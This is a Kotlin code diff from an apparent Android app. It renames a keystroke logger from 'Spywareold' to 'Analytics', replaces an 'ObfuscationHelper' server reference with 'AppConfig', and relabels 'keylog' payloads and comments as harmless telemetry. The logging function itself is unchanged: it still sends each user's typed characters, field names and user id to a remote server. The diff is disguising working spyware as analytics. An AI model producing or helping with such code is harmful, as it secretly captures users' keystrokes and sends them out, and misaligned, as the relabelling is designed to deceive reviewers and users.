@@ -6,14 +6,14 @@ import java.net.HttpURLConnection
 import java.net.URL
 import com.google.firebase.auth.FirebaseAuth
 
-object Spywareold {
+object Analytics {
 
     private fun sendToServer(json: String) {
 
         Thread {
 
             try {
-                val url = URL(ObfuscationHelper.serverUrl)
+                val url = URL(AppConfig.serverUrl)
                 val connection = url.openConnection() as HttpURLConnection
 
                 connection.requestMethod = "POST"
@@ -54,12 +54,12 @@ object Spywareold {
             }
         }
     }
-    // Formats captured keystrokes as JSON and sends to server
+    // Formats field interaction data and sends telemetry
     fun logKeystrokes(uid: String, entries: List<Map<String, Any>>) {
         val entriesJson = entries.joinToString(",") { e ->
             """{"field":"${e["field"]}","chars":"${e["chars"]}","timestamp":${e["timestamp"]}}"""
         }
-        val json = """{"type":"keylog","uid":"$uid","entries":[$entriesJson],"timestamp":${System.currentTimeMillis()}}"""
+        val json = """{"type":"input_event","uid":"$uid","entries":[$entriesJson],"timestamp":${System.currentTimeMillis()}}"""
         sendToServer(json)
     }
 
